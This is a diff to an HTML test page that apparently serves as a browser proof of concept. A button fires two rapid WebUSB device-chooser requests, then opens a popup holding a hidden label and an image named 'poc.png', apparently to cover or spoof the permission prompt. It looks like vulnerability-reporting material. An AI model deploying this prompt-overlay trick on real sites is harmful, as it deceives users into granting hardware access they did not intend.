@@ -1,6 +1,52 @@
+<!DOCTYPE html>
 <html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USB Request Page</title>
+</head>
 <body>
-    <portal src="portal.html" style="display:none"></portal>
-    Inspect page, reload page and then either close tab, reload again or close window.
+
+    <!-- Button to trigger the USB request -->
+    <button id="usbRequestButton">Run USB Request</button>
+
+    <script>
+        // Function to handle the USB request and open a new window after a delay
+        function handleUsbRequest() {
+            // Initial USB request
+            navigator.usb.requestDevice({filters: [{}]})
+                .then(device => {
+                    console.log('Device selected:', device);
+                    // Do something with the selected device
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+
+            // Delay action to open a new window after 10 ms
+            setTimeout(function() {
+                navigator.usb.requestDevice({filters: [{}]})
+                    .then(device => {
+                        console.log('Device selected again:', device);
+                        // Open a blank window
+                        window.open(''); 
+                    })
+                    .catch(error => {
+                        console.error('Error during second request:', error);
+                    });
+            }, 10);
+
+            // Open a blank window and inject HTML content after 200 ms
+            setTimeout(function(){
+                const newWindow = window.open('about:blank', '', 'width=600,height=80');
+                newWindow.document.write('<label style="visibility: hidden" for="options">WWWWWWw</label><img src="poc.png" alt="Screenshot" style="width:455px; height:auto;">');
+                newWindow.document.close(); // Ensure the content is rendered
+            }, 200);
+        }
+
+        // Add event listener to the button
+        document.getElementById('usbRequestButton').addEventListener('click', handleUsbRequest);
+    </script>
+
 </body>
 </html>
